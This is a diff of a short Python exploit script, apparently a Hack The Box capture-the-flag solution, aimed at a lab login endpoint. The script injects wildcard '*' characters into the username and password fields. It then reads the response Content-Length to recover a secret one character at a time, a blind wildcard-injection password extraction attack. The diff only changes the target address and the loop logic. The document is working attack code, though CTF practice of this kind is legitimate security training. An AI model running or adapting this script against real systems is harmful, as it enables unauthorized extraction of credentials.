@@ -2,19 +2,22 @@
 import requests
 import string
 
-url = "http://178.62.5.61:32468/login"
+url = "http://138.68.136.191:31633/login"
 #known start
-leaked = ['H','T','B','{']
+leaked = list("HTB{")
 
 printable = string.printable.replace('*', '')
 
-#loop until known end }
-while leaked[-1] != '}':
+while True:
     print(''.join(leaked))
+    found = False
     for char in printable:    
         r = requests.post(url, {"username":'*', "password": ''.join(leaked) + char + '*'})
         if r.headers['Content-Length'] == '2586': #length of paged returned on success
             leaked.append(char)
+            found = True
             break
+    if not found:
+        break
 
 print('Final password: ' + ''.join(leaked))
